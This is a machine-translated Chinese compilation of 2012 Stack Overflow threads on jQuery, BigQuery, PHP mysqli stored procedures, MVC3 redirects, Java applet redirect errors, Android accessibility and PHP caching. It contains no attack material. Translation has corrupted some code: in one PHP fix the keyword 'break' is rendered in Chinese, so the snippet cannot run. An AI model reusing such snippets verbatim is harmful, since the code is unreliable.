$('#logo span').eq(1).fadeIn(2000); 
```

在这里，我们告诉第二个跨度淡入。

一般来说，这些类型的效果是使用组合在一起的`callback functions`。

```
$('#logo span').eq(0).fadeOut(7000, function(){
    //this is the callback function.
    //when the above fade completes, anything in here will run immediately after.
    $('#logo span').eq(1).fadeIn(2000);
}); 
```

*作为对未来来到这里的任何人的旁注*

我使用了 jQuery 的`.eq()`嘶嘶声选择器，而不是 jQuery 的`:eq()`jQuery 选择器。原因是`sizzle selectors`可以利用`querySelectorAll()`方法，其中 pure`jQuery selectors`必须遍历 DOM 才能找到元素。尽管对于上面的示例，这可能不会节省太多，但总的来说，如果您进行大量遍历，则此关键说明很重要。

# google-bigquery - 使用数学函数作为 Google BigQuery 的表范围基础

> ID：12648768
> 
> 赞同：0
> 
> 时间：2012-09-29T00:04:09.027
> 
> 标签：google-bigquery

我对 bq 完全陌生，我有一个关于 MATH 函数的问题。假设我有一个名为 tab1 的表，其中包含 A、B、C 三个列。我想编写一个查询，用 SUM(A+B) 或 A*B 或逐行替换 C 的值。这意味着如果第一行的 A = 2，B = 3 的值，则 C 将为 5，如果 A = 4，B = 3，则第二行的 C = 7，依此类推。我只是想知道这是否可以通过编写一个查询而不是一一访问每一行并手动更新C的值来实现？

瞄准类似的东西

```
UPDATE tab1 SET C = A+B

OR

UPDATE tab1 SET C = SUM(A,B) 
```

我在思考过程中是否正确，这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:21:33.530

BigQuery 表只能追加，因此您无法运行`UPDATE`查询。

但是，您可以运行如下查询：

```
SELECT
  mother_age, father_age, mother_age + father_age
AS age_sum
FROM
  [publicdata:samples.natality]
WHERE
  mother_age > 25 AND father_age > 25
LIMIT 50; 
```

结果：

```
+------------+------------+---------+
| mother_age | father_age | age_sum |
+------------+------------+---------+
|         28 |         35 |      63 |
|         27 |         42 |      69 |
|         37 |         51 |      88 |
|         38 |         37 |      75 |
etc... 
```

然后将该结果保存到新表中，或将其作为 CSV 文件导出到 Google Cloud Storage。

阅读有关[将数据附加到 BigQuery 表](https://developers.google.com/bigquery/docs/developers_guide#addmoredata)或[将查询结果保存到持久表的](https://developers.google.com/bigquery/docs/developers_guide#queries)信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T01:40:11.810

bigquery 的一个优点是您通常不必存储这些类型的计算——您可以每次都计算它们。BigQuery 会并行处理您的查询，因此即使是添加复杂的计算，在查询时也能非常高效地完成。诸如解析日期、正则表达式、三角函数等之类的东西不会大大降低查询速度。

您甚至可以嵌套查询以使计算更清晰。例如

```
SELECT c, d FROM (
  SELECT (a + b) as c, (a * b) as d FROM dataaset.table
) WHERE c > 0 AND d % 10 == 3 
```

显然，在某些情况下，您可能真的想存储计算数据，在这种情况下，Michael 的解决方案是可行的方法。

# php - 使用准备好的语句从 PHP5 中的 MySQL 存储过程中获取结果

> ID：12648770
> 
> 赞同：3
> 
> 时间：2012-09-29T00:04:26.937
> 
> 标签：php, stored-procedures, mysqli, prepared-statement, resultset

我正在使用 PHP5 和 MySQL 开发一个网站。我使用 mysqlnd 驱动程序，并且我有一个使用准备好的语句来执行我想要的任何查询的类。

我有一张桌子，用于存储有关照片的信息，例如照片的 ID、标题、拍摄地点的纬度和经度等。

我创建了以下存储过程并根据我在这里找到的内容实现了哈弗辛公式：[http ://www.scribd.com/doc/2569355/Geo-Distance-Search-with-MySQL](http://www.scribd.com/doc/2569355/Geo-Distance-Search-with-MySQL)

程序是：

```
DELIMITER $$
CREATE PROCEDURE imagesNearMe(IN user_lat DOUBLE, IN user_lng DOUBLE, IN distance INT)
READS SQL DATA
BEGIN

DECLARE lat1 DOUBLE;
DECLARE lng1 DOUBLE;
DECLARE lat2 DOUBLE;
DECLARE lng2 DOUBLE;

SET lng1 = user_lng - (distance/ABS(COS(RADIANS(user_lat)) * 69));
SET lng2 = user_lng + (distance/ABS(COS(RADIANS(user_lat)) * 69));
SET lat1 = user_lat - (distance/69);
SET lat2 = user_lat + (distance/69);

SELECT id, title, description, location, lat, lng, user_id,
        3956 * 2 * ASIN( SQRT( 
        POWER( SIN( (user_lat - ABS(lat)) * pi() / 180 / 2), 2) + 
        COS(user_lat * pi() / 180) * COS( ABS(lat) * pi() * 180) * POWER( SIN( (user_lng - lng) * pi() / 180 / 2), 2) ) ) as distance
        FROM images
        WHERE (lat IS NOT NULL) AND (lng IS NOT NULL)
            AND (lat BETWEEN lat1 AND lat2)
            AND (lng BETWEEN lng1 AND lng2)
        ORDER BY distance ASC;

END$$
DELIMITER ; 
```

当我从 MySQL 控制台调用它并返回预期的数据时，该过程工作正常。问题是当我尝试从我的 PHP 代码中调用该过程时。由于某种原因，我无法获取该过程返回的数据。

我有以下测试方法：

```
public function CallProcedure( $procedure, $arguments )
    {
        print_r($procedure);
        echo "<br>*************************<br>";

        if( ! $this->_sqlStatement = $this->_dbSession->prepare($procedure))
        {
            return FALSE;
        }

        else
        {
            //Prepare succeeded
            if($arguments)
            {
                //if we have arguments we have to prepare and bind the to the query
                //get the bind string
                $bindString = array_shift($arguments);

                //get references to the parameters passed to the query
                $bindParamRefs = array();
                foreach($arguments as $key => $value)
                {
                    $bindParamRefs[$key] = &$arguments[$key];
                }
                //put a reference to the bindString inside the bindParamsRefs array
                array_unshift($bindParamRefs, $bindString);

                print_r($bindParamRefs);
                echo "<br>*************************<br>";
                //Bind the params to the query
                if(!call_user_func_array(array($this->_sqlStatement, "bind_param"), $bindParamRefs))
                {
                    return FALSE;
                }

                else
                {
                    print_r($this->_sqlStatement);
                    echo "<br>*************************<br>";
                    if( ! $this->_sqlStatement->execute() )
                    {
                        return FALSE;
                    }

                    else
                    {
                        do
                    {
                        $this->_sqlStatement->store_result();
                        print_r($this->_sqlStatement);
                        echo "<br>*************************<br>";

                        $resultSet = array();
                        $resultMetadata = $this->_sqlStatement->result_metadata();
                        $resultVariables = array();
                        $resultData = array();

                        while($resultField = $resultMetadata->fetch_field())
                        {
                            $resultVariables[] = &$resultData[$resultField->name];
                        }

                        call_user_func_array(array($this->_sqlStatement, "bind_result"), $resultVariables);

                        $i = 0;
                        while( $this->_sqlStatement->fetch() )
                        {
                            $resultSet[$i] = array();
                            foreach($resultData as $fieldName => $fieldData)
                            {
                                $resultSet[$i][$fieldName] = $fieldData;
                            }
                            $i++;
                        }

                        print_r($resultSet);
                        echo "<br>*************************<br>";
                        print_r($resultMetadata);
                        echo "<br>*************************<br>";
                        print_r($resultVariables);
                        echo "<br>*************************<br>";
                        print_r($resultData);
                        echo "<br>*************************<br>";

                        $this->_sqlStatement->free_result();

                    }
                    while($this->_sqlStatement->more_results() && $this->_sqlStatement->next_result());

                    $this->_sqlStatement->close();
                    }
                }
            }
        }

    } 
```

（$this->_dbSession 是 mysqli 的一个实例）

上面代码产生的输出是：

```
CALL imagesNearMe(?, ?, ?)
*************************
Array ( [0] => ddi [1] => 38.246214 [2] => 38.246214 [3] => 150 ) 
*************************
mysqli_stmt Object ( [affected_rows] => -1 [insert_id] => 0 [num_rows] => 0 [param_count] => 3 [field_count] => 0 [errno] => 0 [error] => [sqlstate] => 00000 [id] => 1 ) 
*************************
mysqli_stmt Object ( [affected_rows] => 0 [insert_id] => 0 [num_rows] => 0 [param_count] => 3 [field_count] => 8 [errno] => 0 [error] => [sqlstate] => 00000 [id] => 1 ) 
*************************
Array ( ) 
*************************
mysqli_result Object ( [current_field] => 8 [field_count] => 8 [lengths] => [num_rows] => 0 [type] => 1 ) 
*************************
Array ( [0] => [1] => [2] => [3] => [4] => [5] => [6] => [7] => ) 
*************************
Array ( [id] => [title] => [description] => [location] => [lat] => [lng] => [user_id] => [distance] => ) 
************************* 
```

如您所见，即使语句正确执行，也不会返回任何数据，即使通过从 mysql 控制台调用具有完全相同参数的完全相同的过程返回 4 个结果。

我错过了什么吗？我完全迷失在这里。

提前感谢您的帮助。

* * *

更新

* * *

以下代码：

```
$dbSession = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME, DB_PORT);

if($dbSession->connect_errno)
{
    die($dbSession->connect_error);
}

else
{
    $query = "CALL imagesNearMe(38.2462140, 21.735098, 50)";

    if(!$dbSession->multi_query($query))
    {
        die($dbSession->error);
    }

    else
    {
        do
        {
            if($result = $dbSession->store_result())
            {
                var_dump($result->fetch_all());
                echo "<br>******************************************************<br>";
                $result->free();
            }
            else
            {
                die($dbSession->error);
            }
        }
        while($dbSession->more_results() && $dbSession->next_result());

        $dbSession->close();
    }
} 
```

返回我期望的所有结果，但为什么准备好的语句不起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T08:28:55.700

发现你的问题

由于工作方式的原因，`call_user_func_array`您需要使用引用（“&”），并且您正在通过`fetch()`相同引用上的方法循环 -**但是**有第二个结果集“OK”返回说 CALL 语句是成功的正在使用空白结果集覆盖您要查找的结果集

尝试改变

```
$i = 0;
while( $this->_sqlStatement->fetch() )
{
     $resultSet[$i] = array();
     foreach($resultData as $fieldName => $fieldData)
     {
          $resultSet[$i][$fieldName] = $fieldData;
     }
     $i++;
}

```

至

```
if(!$this->_sqlStatement->fetch())
{
     //打破do-while()循环
     休息;
}
$resultSet[$i] = array();
foreach($resultData as $fieldName => $fieldData)
{
     $resultSet[$i][$fieldName] = $fieldData;
}
$i++;

```

您还需要`$i`在 do-while() 开始之前设置初始值

# asp.net-mvc - 如何在 MVC3 中的 JQuery ajax 调用上重定向到新页面（连同模型）

> ID：12648780
> 
> 赞同：1
> 
> 时间：2012-09-29T00:07:00.320
> 
> 标签：asp.net-mvc, asp.net-mvc-3, jquery

我忘记了密码页面，用户输入用户名并单击“验证”按钮以检查他所在的组。根据组，我们需要显示不同的部分视图（现在假设它是电话号码）这页纸。填写有效详细信息后，**成功时我将重定向到他将更新密码的新页面，失败时，我需要显示错误消息。**

现在我很难编写突出显示的代码。

这是在提交按钮单击时触发的 Jquery ajax 函数的代码

```
person = {UserName: $("#UserName").val(), Phone: $("#Phone").val() }
$.ajax({
            type: 'POST',
            url: '@Url.Action("ForgotPassword", "Customer")',
            data: person,
            dataType: 'json',
            success: function (data) {
                //This is the place I need help
                if(data.IsDataValid){
                  // redirect to new page passing the model object
                }
                else{
                    //Show an error message without hiding the div
                }
            },
            failure: function () {                   
            }
        }); 
```

这是代码控制器动作

```
 [HttpPost]
    [ValidateInput(true)]
    public ActionResult ForgotPassword(RegisterModel model)
    {            
        if (Request.IsAjaxRequest())
        {
            Here is the logic which validates the user
            return Json(new { regmodel = RegistrationModel })
        }
    //If it is not ajax call I want to return the view
        if (isUsergroup1 == true)
        {
            return View("View1", RegistrationModel );
        }
        else if (isUsergroup2 == true)
        {
            return View("View2", RegistrationModel );
        }
        else
        {
            return View();
        }

    } 
```

请帮忙。提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T15:43:25.483

这就是我们需要做的。我们不能传递模型，我们只能在一个链接的重定向中传递参数。我们必须使用 link.replace 因为您可以将变量直接传递到 Url.Action

```
person = {UserName: $("#UserName").val(), Phone: $("#Phone").val() }
 $.ajax({
        type: 'POST',
        url: '@Url.Action("ForgotPassword", "Customer")',
        data: person,
        dataType: 'json',
        success: function (data) {
            //This is the place I need help
            if(IsDataValid){
              var link = "@Url.Action("Actionname", "Controllername", new { username = "1", phone ="2" })";
                   link = link.replace("1", data.username);
                   link = link.replace("2", data.phone);
                   alert(link);
                   window.location.href= link ;
            }
            else{
                //Show an error message without hiding the div
            }
        },
        failure: function () {                   
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T18:08:07.860

解决您现在可以回答的问题部分：

```
if(IsDataValid){
  // redirect to new page(
}
else{
    //Show an error message without hiding the div
} 
```

要重定向，请使用`window.location.replace('url to new page');`.

对于“错误消息”部分，我会使用 jQuery UI 来显示一个对话框，或者有一个隐藏的 div 来插入错误消息，可能像这样：

```
$('#errors').html(data.Errors).show(); 
```

这假设您有某种名为的属性`Errors`，其中包含`RegistrationModel`.

# java - 使用私有静态布尔值

> ID：12648789
> 
> 赞同：0
> 
> 时间：2012-09-29T00:08:26.533
> 
> 标签：java, static, private

我是一个全新的 Java 学生，我一直在搜索谷歌和我的教科书，以弄清楚使用私有静态布尔值到底意味着什么，尽管这些都没有任何意义，所以我想我会问专家。我的问题是我需要使用私有静态类，尽管我不知道如何从 main 中提取我需要的数据（我的教授已经写好了）。您有什么建议或见解吗？我基本上是将已经以嵌套循环形式编写的代码转换为私有类。

编辑：这是我必须使用的（我不是在寻找讲义）

```
import java.io.*;
import java.util.*;

public class Foo
{
public static void main (String[] args) throws Exception
{

    int lo = 0;
    int hi = 0; 
    String infileName; 

    if (args.length < 3)
    {
            System.out.println("CMD LINE INPUT ERROR: Must enter 2 numbers followed by name of input file on cmd line.");
            System.exit(0);
    }

    lo = Integer.parseInt(args[0]);
    hi = Integer.parseInt(args[1]);
    infileName = args[2];

    for( int n = lo; n<=hi; n++)
        if (isPrime(n))
            System.out.print(n + " ");
    System.out.println();

    for( int n=lo; n<=hi; n++)
        if (isPerfect(n))
            System.out.print(n + " ");
    System.out.println();

    while (infile.ready()) 
    {
        String line = infile.readLine(); 
        if ( isPalindrome( line ) )
            System.out.println( line + " IS a palindrome");
        else
            System.out.println( line + "is NOT a palindrome");
    }
    infile.close();

} 

} 
```

作业分为三个部分：寻找素数、完美数和回文数。对于第 1 部分的示例，我以前使用以下方法查找素数

```
for(int i= lo; i < hi; i++)
        {

            boolean isPrime = true;

            for(int j=2; j < i ; j++)
            {

                if(i % j == 0)
                {
                    isPrime = false;
                    break;
                }
            }

            if(isPrime)
            System.out.print(i + " ");
        }

        System.out.println(); 
```

我大多不确定如何以新的方式应用我已经知道的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:17:45.277

首先，您提到了**私有静态类**，您可以拥有一个**静态内部类**。**但是你不能用私有修饰符**标记一个类（外部类），即你不能有一个**私有类**（外部类）。外部类只能用**public**或**final**或**abstract**或**default 标记（无修饰符）**

**私有静态布尔值：**

**private**是一个**访问修饰符**，可用于实例变量和方法。私有变量和私有方法只限于声明它们的类。

**static**是一个**非访问修饰符**，可用于变量和方法。静态变量由类的所有实例共享。

**boolean**是一种**原始数据类型**，可以为真或假。

如果您将布尔变量声明为私有静态，例如

```
 class MyClass {
       private static boolean bool;
   } 
```

1\. 这个布尔变量只能从它定义的类（MyClass）中访问。

2.为这个类（MyClass）创建的所有实例共享这个布尔变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:13:19.237

您不会从 main 中获取数据，main 会跳转到其他函数并将所需的数据传递给它们。如果您在谈论成员变量，基本上只是将当前本地但多次使用的内容移动到类块下方而不是任何函数中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:21:20.910

您对“类”一词的使用令人困惑，尽管我相信您实际上是指“方法”而不是“类”

通过“私有静态布尔值”，我猜你正在谈论一个*方法的**标题*，它是一个代码块，可以在程序中的任何位置调用（调用）。一个方法通常接受一定数量的参数，并且经常但不总是返回一个值。

 *private：将方法的使用限制在定义它的*类*中。

static：静态方法，可以通过类名直接访问，不需要任何对象，即ClassName.methodName() vs. ObjectName.methodName()。

boolean：简单地表示方法返回一个*布尔*值。

您的代码可能如下所示：

```
private static boolean isBiggerThanZero( int number)
{
    boolean isBigger = false;

    //Do something with number or test it for a condition
    if( number > 0 )
        isBigger = true;

   return isBigger;
} 
```*

# api - pageupdates/add 返回无效的 JSON

> ID：12648791
> 
> 赞同：0
> 
> 时间：2012-09-29T00:08:46.650
> 
> 标签：api, foursquare

我假设这也是报告问题的适当论坛。如果没有，请道歉。

pageupdates/add 端点正在返回无效的 JSON 响应。有一个重复的“喜欢”键。请参阅下面截断的响应中的 response.pageUpdate。

```
{
"meta": {
      "code": 200
},
"notifications": [
    {
        "type": "notificationTray",
        "item": {
            "unreadCount": 0
        }
    }
],
"response": {
    "pageUpdate": {
        "id": "xxx",
        "createdAt": 1348875498,
        "page": {
        },
        "shout": "...",
        "entities": [
        ],
        "photos": {
        },
        "likes": {
            "count": 0,
            "groups": [

            ]
        },
        "canonicalUrl": "...",
        "venues": {
        },
        "venueGroups": {
        },
        "deliveryCount": 0,
        "scopeSize": 1,
        "creator": {
        },
        "likes": {
            "count": 0,
            "groups": [

            ]
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T18:58:52.543

谢谢你的报告，詹姆斯。我们已经解决了这个问题，并且重复的喜欢条目应该在我们的下一次部署中停止出现。

# c# - 请求基本身份验证的开发页面

> ID：12648792
> 
> 赞同：0
> 
> 时间：2012-09-29T00:08:51.570
> 
> 标签：c#, asp.net

我是 asp.net 的初学者，并被要求开发一个请求基本身份验证的页面。当用户点击链接时，将弹出登录屏幕（对话框）。用户填写用户名和密码后，请求的http头将显示加密的用户名和密码。

我尝试了一切，但我无法正确

这是我的代码

`code`

```
public partial class Authenticate : System.Web.UI.Page
{
protected void Page_Load(object sender, EventArgs e)
{
            Uri uri = new Uri("http://abdullahtk.somee.com");  
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);  

            request.UseDefaultCredentials = true;
            Response.AddHeader("WWW-Authenticate", "BASIC Realm=My Realm");
            WebResponse v = request.GetResponse();  
            Stream rStream = v.GetResponseStream();  
            StreamReader str = new StreamReader(rStream);  
            if (str.EndOfStream != true)  
            {  
                Response.Write(str.ReadToEnd());  
            }  
            v.Close();  
            rStream.Close();  
            str.Close();  

        }  
} 
```

请帮我！？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:11:21.363

如果您想要基本身份验证而不是表单身份验证，您可以配置 IIS 以使用它：[http ://technet.microsoft.com/en-us/library/cc772009%28v=WS.10%29.aspx](http://technet.microsoft.com/en-us/library/cc772009%28v=WS.10%29.aspx)

这将适用于 ASP.NET、PHP、Classic ASP 等……甚至是普通的 .HTML！

# java - Java：安全异常 - 非法 url 重定向

> ID：12648798
> 
> 赞同：2
> 
> 时间：2012-09-29T00:10:57.833
> 
> 标签：java, security, exception, applet

有没有人遇到过这个？这给我的小程序工作带来了很多麻烦。我认为它不起作用的原因是由于我的程序中的套接字与服务器通信。但是，我不知道如何阻止它，谷歌也没有帮助。我无法获得异常，因为 google chrome 的 java 控制台没有输出错误，只是在单击错误小程序说它出错后才给我一个弹出窗口。如果需要代码，我会添加。提前谢谢。

```
security:  --- parseCommandLine converted : -Djava.net.preferIPv4Stack=true
into:
[-Djava.net.preferIPv4Stack=true]
basic: Added progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892
basic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/DatRLTest.jar
basic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/SharedClasses.jar
security: Blacklist revocation check is enabled
security: Trusted libraries list check is enabled
network: Cache entry found [url: http://voidchar.com/Other/DatRLTest.jar, version: null] prevalidated=false/0
cache: Resource http://voidchar.com/Other/DatRLTest.jar has expired.
network: Connecting http://voidchar.com/Other/DatRLTest.jar.pack.gz with proxy=DIRECT
network: Connecting http://voidchar.com:80/ with proxy=DIRECT
basic: exception: illegal URL redirect.
java.lang.SecurityException: illegal URL redirect
at com.sun.deploy.net.HttpUtils.followRedirects(Unknown Source)
at com.sun.deploy.net.BasicHttpRequest.doRequest(Unknown Source)
at com.sun.deploy.net.BasicHttpRequest.doGetRequestEX(Unknown Source)
at com.sun.deploy.cache.ResourceProviderImpl.checkUpdateAvailable(Unknown Source)
at com.sun.deploy.cache.ResourceProviderImpl.isUpdateAvailable(Unknown Source)
at com.sun.deploy.cache.DeployCacheHandler.get(Unknown Source)
at sun.net.www.protocol.http.HttpURLConnection.plainConnect(Unknown Source)
at sun.net.www.protocol.http.HttpURLConnection.connect(Unknown Source)
at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
at sun.plugin.PluginURLJarFileCallBack.downloadJAR(Unknown Source)
at sun.plugin.PluginURLJarFileCallBack.access$000(Unknown Source)
at sun.plugin.PluginURLJarFileCallBack$1.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at sun.plugin.PluginURLJarFileCallBack.retrieve(Unknown Source)
at sun.net.www.protocol.jar.URLJarFile.retrieve(Unknown Source)
at sun.net.www.protocol.jar.URLJarFile.getJarFile(Unknown Source)
at sun.net.www.protocol.jar.JarFileFactory.get(Unknown Source)
at sun.net.www.protocol.jar.JarURLConnection.connect(Unknown Source)
at sun.plugin.net.protocol.jar.CachedJarURLConnection.connect(Unknown Source)
at sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFileInternal(Unknown Source)
at sun.plugin.net.protocol.jar.CachedJarURLConnection.getJarFile(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath$JarLoader.getJarFile(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath$JarLoader.access$1000(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath$JarLoader$1.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at com.sun.deploy.security.DeployURLClassPath$JarLoader.ensureOpen(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath$JarLoader.<init>(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath$3.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath.getLoader(Unknown Source)
at com.sun.deploy.security.DeployURLClassPath.getResource(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader$2.run(Unknown Source)
at java.security.AccessController.doPrivileged(Native Method)
at sun.plugin2.applet.Plugin2ClassLoader.findClassHelper(Unknown Source)
at sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)
at java.lang.ClassLoader.loadClass(Unknown Source)
at sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)
at sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)
at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)
at java.lang.Thread.run(Unknown Source)
Ignored exception: java.lang.SecurityException: illegal URL redirect
basic: Dialog type is not candidate for embedding
basic: Removed progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892
basic: Loading Java Applet Failed...
security: Accessing keys and certificate in Mozilla user profile: null
security: Reset deny session certificate store 
```

编辑：这是我用来加载小程序的 html 代码。

```
 {applet width=800 height=800 archive='DatRLTest.jar,SharedClasses.jar'    code='vc.voidwhisperer.datrl.main'}
    {PARAM name="java_arguments" value="-Djava.net.preferIPv4Stack=true"}
    {/applet} 
```

小于和大于符号被替换，因为它不喜欢我试图把东西放在他们身上。

编辑#2：我已经对 jar 进行了自签名，这仍在发生。我还没有弄清楚如何解决这个问题..

最终编辑：经过几个小时的工作，我终于找到了一个解决方案，感谢 irc 频道中的一位朋友。以下是如何修复它的一般要点：

*   如果查看输出的特定行：network: Connecting [http://voidchar.com/Other/DatRLTest.jar.pack.gz](http://voidchar.com/Other/DatRLTest.jar.pack.gz) with proxy=DIRECT。
*   在查找该文件时，它不存在。
*   对文件类型进行一些研究，它是一个 pack200 jar，可以使用 jar 制作，然后用它执行以下操作：打开 cmd，然后输入“pack200 example.jar.pack.gz [JarLocation]”。
*   现在，将 example.jar 替换为您的 jar 文件的名称，但将 .pack.gz 保留在那里。
*   现在，将该文件上传到与小程序相同的目录并尝试再次加载小程序。

**注意：确保小程序已签名！**希望这可以帮助其他人解决我遇到的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T01:07:47.850

您的小程序违反了“同源”限制，这是默认的小程序安全限制，旨在保护用户免受恶意小程序的侵害。

有关限制的解释以及强制执行的原因，请参阅[此博客文章。](https://nealpoole.com/blog/2011/10/java-applet-same-origin-policy-bypass-via-http-redirect/)

* * *

你能为这个做什么？最好的办法是重新设计您的小程序和/或服务，以便完全删除重定向，或者重定向到不违反限制的 URL。如果这不是一个选项，您将需要使您的小程序成为“受信任的小程序”；例如，请参阅[本教程](http://www-personal.umich.edu/~lsiden/tutorials/signed-applet/signed-applet.html)以了解问题。

* * *

**更新**

我错了让小程序成为受信任的小程序。它不会有帮助。我查看了 OpenJDK 源代码（[此处](http://javasourcecode.org/html/open-source/jdk/jdk-6u23/com/sun/deploy/net/HttpUtils.java.html)和[此处](http://www.docjar.com/html/api/sun/net/www/protocol/http/HttpURLConnection.java.html)），似乎执行了“同源”安全检查，而与安全策略无关。（查找使用该消息引发异常的代码......）

因此，您唯一的选择是从与链接到它的网页相同的主机和端口为小程序提供服务。换句话说，不要违反“同源”规则。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T02:20:59.727

就我的研究而言，每当 java 请求小程序并获得 HTTP 300 响应时，都会导致此问题。首先java会尝试加载applet的压缩版本，例如“yourjarfile.jar.pack.gz”。如果服务器提供 HTTP 404，一切都按预期工作。但是，如果服务器提供 HTTP 300 响应，java 假定存在重定向目标，如果没有设置则失败。

根据我的经验，您可以执行以下操作来解决服务器端的问题：

1.  如果您的小程序由单个 jar 文件组成并且之后没有加载数据，您可以使用 pack200 工具压缩您的小程序并用新文件替换原始 jar。确保 .pack.gz 文件扩展名附加到原始文件。
2.  如果你有一个 apache 并完全控制你的服务器，你可以卸载 mod_speling。确保这对于您正在运行的其他环境来说没问题。
3.  如果您可以使用 .htaccess 文件，您可以禁用对加载小程序的文件夹的拼写检查。为此，创建一个内容为“CheckSpelling off”的 .htaccess 文件。如果已经存在 .htaccess 文件，只需将这一行添加到其中。

我希望这可以帮助一些人。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:17:37.773

您可能违反了您的 java applet 环境的沙盒策略。无论您想做什么，您都没有所需的凭据，并且您没有询问用户是否可以，因此环境杀死了您。

[http://docs.oracle.com/javase/tutorial/security/tour1/step1.html](http://docs.oracle.com/javase/tutorial/security/tour1/step1.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T22:36:44.880

在使用 Java 1.7.0_09 时，我在客户的服务器上看到了同样的问题。如果我使用早期版本的 Java 则没有问题。如果我在不同的服务器上运行相同的 Applet，那就没问题了。

我终于找到了解决办法。我清除了我的 Java 缓存。（这与浏览器缓存不同。）

在 Windows 7 上，您可以：

1.  启动 Java 控制面板，
2.  单击“常规”选项卡，
3.  在“临时 Internet 文件”下单击“设置”，
4.  点击“删除文件”，
5.  只选择“缓存的应用程序和小程序”并点击确定。

清除我的 Java 缓存花了将近一分钟。

然后一切正常。

# android - 覆盖包含图标和 TextView 的 LinearLayout 的 TalkBack 文本

> ID：12648800
> 
> 赞同：1
> 
> 时间：2012-09-29T00:11:11.427
> 
> 标签：android, accessibility

我基本上有这个：

```
<MyCustomLinearLayout>
  <ImageView>
  <TextView>
</MyCustomLinearLayout> 
```

我想覆盖整个布局子结构的可访问性文本；当 LinearLayout 或它的任何一个孩子被 tuoched 时，我想完全控制 TalkBack 所说的内容（所以我可以让它说“3 comments”而不是“Comment Icon 3”）。

我尝试了各种覆盖`sendAccessibilityEventUnchecked`, `dispatchPopulateAccessibilityEvent`,`requestSendAccessibilityEvent`等的组合都无济于事，而且我在任何地方都找不到这种相当简单的设置的示例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T05:42:43.493

在布局上使用[View.setContentDescription()](http://developer.android.com/reference/android/view/View.html#setContentDescription%28java.lang.CharSequence%29)动态设置文本并防止 TalkBack 读取子视图的内容。

```
myText.setText(text);
. . .
myLayout.setContentDescription(imageDescription + " " + text); 
```

由于您正在动态设置描述，因此您可以在布局 XML 中将图像的内容描述设置为 @null 以避免 Lint 错误。

```
<ImageView
    . . .
    android:contentDescription="@null" /> 
```

[还可以考虑观看最近有关使 Android 应用程序可访问](http://www.youtube.com/watch?v=jPKKHNuVmeA)的 Android 开发人员办公时间视频，其中涵盖了这些主题以及更多内容。

# php - 设置我的 PHP 缓存——我应该修改吗？

> ID：12648803
> 
> 赞同：0
> 
> 时间：2012-09-29T00:11:30.313
> 
> 标签：php, caching, memory, memcached

我已经设置了我的 PHP 内存缓存技术版本，每个用户都有一个可以写入/读取其信息的文档——以使事情变得更快。

现在（如果用户是第一次登录，并且他们的内存缓存尚未设置），我让系统查询 MYSQL DB 以获取用户信息（姓名、位置、电子邮件等），然后写入他们的文档文件。然后，每当系统需要再次获取他们的信息时，它会检查该文件是否存在，如果存在，则从那里提取数据；如果它不存在，它会根据从数据库检索到的信息创建它。

我当然打算加密文件。这是一个示例，首先我检查文件是否存在，然后是否存在：

```
$my_file = 'members/'.$my_id.'/cache/data_main.txt';
$handle = fopen($my_file, 'r+') or die('Cannot open file:  '.$my_file); //implicitly creates file
$my_memdata = explode("\n", file_get_contents($my_file));

$var1 = $my_memdata[0];
$var2 = $my_memdata[1];
$var3 = $my_memdata[2];
$var4 = $my_memdata[3];
$var4 = str_replace("<br />", "", $var4);
$var5 = $my_memdata[4];
$var6 = $my_memdata[5]; 
```

这就是我的布局方式，我查看了实际的内存缓存，但大部分情况下如何实现它令人困惑。

你对这个方法有什么想法，我应该如何加强它？

另外，您对这一时期有何看法？我应该做任何修改吗？

# mysql - 如何为大型文本和 html 字段有效地设置 MySQL 数据库

> ID：12648805
> 
> 赞同：1
> 
> 时间：2012-09-29T00:11:35.263
> 
> 标签：mysql, codeigniter, database-design, phpmyadmin, tinymce

